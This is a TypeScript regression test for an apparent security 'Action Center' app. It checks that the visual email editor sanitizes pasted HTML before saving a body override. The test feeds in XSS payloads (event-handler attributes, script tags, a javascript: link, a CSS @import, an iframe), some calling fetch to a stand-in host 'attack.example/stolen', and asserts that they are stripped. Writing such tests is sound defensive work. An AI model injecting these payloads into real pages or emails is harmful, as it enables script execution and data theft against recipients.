import assert from 'node:assert/strict';
import test from 'node:test';
import { mkdtemp, rm } from 'node:fs/promises';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';
import { build } from 'esbuild';
import { JSDOM } from 'jsdom';
import React, { act } from 'react';

/**
 * The Action Center's visual email editor writes into a contenteditable, so
 * its body is whatever the browser put in the DOM: pasted markup, typed keys,
 * or the result of an execCommand. That body becomes the saved override and is
 * what the recipient receives, so the composer has to pass it through the same
 * sanitizer as the preview. Before the fix the override was written verbatim,
 * which let a paste of `<img onerror>` or a `javascript:` link reach the mail
 * transport.
 *
 * The edit path is exercised end to end: open a queued delivery, put hostile
 * markup in the editor, fire the input handler the editor uses, then save and
 * inspect exactly what was handed to the server.
 */
test('the visual email editor sanitizes the body before saving the override', async () => {
  const dom = new JSDOM('<div id="root"></div>', { url: 'http://localhost' });
  const globals = globalThis as any;
  globals.window = dom.window;
  globals.document = dom.window.document;
  globals.HTMLElement = dom.window.HTMLElement;
  globals.DOMParser = dom.window.DOMParser;
  globals.Node = dom.window.Node;
  globals.IS_REACT_ACT_ENVIRONMENT = true;

  const savedEdits: Array<Record<string, unknown>> = [];
  const queuedLog = {
    id: 'log-1',
    advisoryId: 'ADV-1',
    recipientEmail: 'soc@example.com',
    subject: 'Queued advisory',
    status: 'QUEUED',
    attemptCount: 0,
    sentAt: null,
    createdAt: new Date().toISOString(),
    provider: 'smtp',
    actionStatus: 'PENDING',
  };
  const emailLogsPage = { items: [queuedLog], total: 1, limit: 25, offset: 0 };
  const previewPayload = {
    html: '<html><body><p>Hello</p></body></html>',
    subject: 'Queued advisory',
    edits: {},
  };
  const context = {
    settings: {},
    refresh: async () => true,
    retryEmailDelivery: async () => true,
    resendEmailDelivery: async () => true,
    editEmailReview: async (_id: string, edits: Record<string, unknown>) => {
      savedEdits.push(edits);
      return true;
    },
    previewEmailReview: async () => previewPayload,
    previewEmailEdits: async () => previewPayload,
    acknowledgeEmailDelivery: async () => true,
    updateAndSendEmail: async () => true,
    deleteEmailQueueItem: async () => true,
    advisories: [],
    findings: [],
    fetchCollection: async () => emailLogsPage,
    refreshVersion: 0,
    session: { username: 'admin', role: 'ADMIN' },
  };
  globals.__actionCenterContext = context;

  const directory = await mkdtemp(join(process.cwd(), '.action-center-test-'));
  const output = join(directory, 'view.mjs');
  await build({
    entryPoints: ['src/components/ActionCenter.tsx'],
    outfile: output,
    bundle: true,
    platform: 'node',
    format: 'esm',
    packages: 'external',
    external: ['dompurify'],
    plugins: [
      {
        name: 'test-context',
        setup(builder) {
          builder.onResolve({ filter: /\/context\/AppContext$/ }, () => ({ path: 'context', namespace: 'test' }));
          builder.onLoad(
            { filter: /.*/, namespace: 'test' },
            () => ({ contents: 'export const useApp = () => globalThis.__actionCenterContext;' }),
          );
        },
      },
    ],
  });
  const { ActionCenter } = await import(pathToFileURL(output).href);
  const { createRoot } = await import('react-dom/client');
  let root = createRoot(document.getElementById('root')!);

  const host = 'https://attack.example';
  const hostileBody =
    `<p onmouseover="alert(1)">ok</p>` +
    `<img src="x" onerror="fetch('${host}/stolen')">` +
    `<script>fetch('${host}/stolen')</script>` +
    `<a href="javascript:fetch('${host}/stolen')">click</a>` +
    `<style>@import url('${host}/x.css');</style>` +
    `<iframe src="${host}"></iframe>`;

  const clickRow = async () => {
    const row = document.querySelector('tbody tr');
    assert.ok(row, 'the queued delivery is listed');
    await act(async () => row!.dispatchEvent(new dom.window.MouseEvent('click', { bubbles: true })));
  };

  try {
    await act(async () => root.render(React.createElement(ActionCenter)));
    // Let the debounced collection fetch and the preview promise settle.
    await act(async () => {
      await new Promise((resolve) => setTimeout(resolve, 300));
    });
    await clickRow();

    const editor = document.querySelector('[contenteditable="true"]');
    assert.ok(editor, 'the editor dialog opened');

    // The visual editor commits on every input event (handleHtmlInput).
    await act(async () => {
      editor!.innerHTML = hostileBody;
      editor!.dispatchEvent(new dom.window.Event('input', { bubbles: true }));
    });
    // The input handler finishes in a setTimeout(0); flush it.
    await act(async () => {
      await new Promise((resolve) => setTimeout(resolve, 20));
    });

    const reason = document.getElementById('update-reason') as HTMLTextAreaElement | null;
    assert.ok(reason, 'the update reason field exists');
    await act(async () => {
      // Same realm as the rendered element (the bundle resolved React from the
      // test's module graph), so take the descriptor from its own prototype.
      Object.getOwnPropertyDescriptor(Object.getPrototypeOf(reason), 'value')!.set!.call(reason, 'typo in subject');
      reason!.dispatchEvent(new dom.window.Event('input', { bubbles: true }));
    });

    const save = [...document.querySelectorAll('button')].find((b) => b.textContent?.trim() === 'Save edits');
    assert.ok(save, 'the save button is present');
    await act(async () => {
      (save as HTMLButtonElement).click();
      await new Promise((resolve) => setTimeout(resolve, 20));
    });

    assert.equal(savedEdits.length, 1, 'the edit was submitted once');
    const override = String(savedEdits[0].customBodyOverride ?? '');
    assert.ok(override.includes('ok'), 'benign text is preserved');
    assert.ok(!/onerror|onmouseover|<script|javascript:|<iframe|<style|@import/i.test(override), override);
    assert.ok(!override.includes(host), 'no attacker-controlled URL survives');

    await act(async () => root.unmount());
  } finally {
    await act(async () => root.unmount());
    dom.window.close();
    delete globals.__actionCenterContext;
    await rm(directory, { recursive: true, force: true });
  }
});
